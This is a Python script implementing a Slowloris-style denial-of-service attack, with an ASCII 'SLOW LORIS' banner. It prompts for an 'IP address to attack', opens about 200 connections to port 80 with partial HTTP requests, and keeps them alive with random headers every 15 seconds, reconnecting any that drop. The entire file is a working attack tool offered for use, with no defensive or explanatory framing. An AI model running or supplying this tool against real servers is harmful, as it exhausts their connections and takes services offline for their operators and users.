#!/usr/bin/env python3

import socket
from re import compile
from time import sleep
from random import randint


# Regex patterns
IP_ADDR_PAT = compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")

# Default values
INTENTED_SOCKET_COUNT = 200


def make_socket(ip_addr, user_agent):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip_addr, 80))

    s.send(f"GET /?{randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
    s.send(f"User-Agent: {user_agent}\r\n".encode("utf-8"))
    s.send(f"Accept-Language: en-US,en,q=0.5\r\n".encode("utf-8"))

    return s


print(r"""  ██████  ██▓     ▒█████   █     █░    ██▓     ▒█████   ██▀███   ██▓  ██████ 
▒██    ▒ ▓██▒    ▒██▒  ██▒▓█░ █ ░█░   ▓██▒    ▒██▒  ██▒▓██ ▒ ██▒▓██▒▒██    ▒ 
░ ▓██▄   ▒██░    ▒██░  ██▒▒█░ █ ░█    ▒██░    ▒██░  ██▒▓██ ░▄█ ▒▒██▒░ ▓██▄   
  ▒   ██▒▒██░    ▒██   ██░░█░ █ ░█    ▒██░    ▒██   ██░▒██▀▀█▄  ░██░  ▒   ██▒
▒██████▒▒░██████▒░ ████▓▒░░░██▒██▓    ░██████▒░ ████▓▒░░██▓ ▒██▒░██░▒██████▒▒
▒ ▒▓▒ ▒ ░░ ▒░▓  ░░ ▒░▒░▒░ ░ ▓░▒ ▒     ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░▓  ▒ ▒▓▒ ▒ ░
░ ░▒  ░ ░░ ░ ▒  ░  ░ ▒ ▒░   ▒ ░ ░     ░ ░ ▒  ░  ░ ▒ ▒░   ░▒ ░ ▒░ ▒ ░░ ░▒  ░ ░
░  ░  ░    ░ ░   ░ ░ ░ ▒    ░   ░       ░ ░   ░ ░ ░ ▒    ░░   ░  ▒ ░░  ░  ░  
      ░      ░  ░    ░ ░      ░           ░  ░    ░ ░     ░      ░        ░  
                                                                             """)

while True:
    ip_addr = input("IP address to attack: ").strip()
    if IP_ADDR_PAT.search(ip_addr):
        break

    print(f"\033[31mERROR\033[0m: Please enter a valid IPv4 address.")

while True:
    user_agent = input("User agent: ").strip()
    if user_agent:
        break

    print(f"\033[31mERROR\033[0m: Please enter a user agent.")

while True:
    socket_count_str = input("Socket count: ").strip()
    if socket_count_str.isdigit() and int(socket_count_str) > 0:
        SOCKET_COUNT = int(socket_count_str)
        break
    else:
        print(f"\033[31mERROR\033[0m: Please enter a positive integer.")

sockets = []
for i in range(INTENTED_SOCKET_COUNT):
    try:
        print(f"Creating socket #{i + 1}...", end="")
        s = make_socket(ip_addr, user_agent)
        print(f" \033[32mSuccess\033[0m")
    except socket.error as e:
        print(f" \033[31mFailure\033[0m: {e}")
        break

    sockets.append(s)

while len(sockets) > 0:
    print(f"Sending keep-alive headers... Remaining socket count: {len(sockets)}")

    for s in sockets:
        try:
            s.send(f"X-a: {randint(1, 5000)}\r\n".encode("utf-8"))
        except socket.error:
            sockets.remove(s)

    for _ in range(INTENTED_SOCKET_COUNT - len(sockets)):
        print("Recreating socket...", end="")

        try:
            s = make_socket(ip_addr, user_agent)
            if s:
                sockets.append(s)
            print(f" \033[32mSuccess\033[0m")
        except socket.error as e:
            print(f" \033[31mFailure\033[0m: {e}")
            break

    sleep(15)
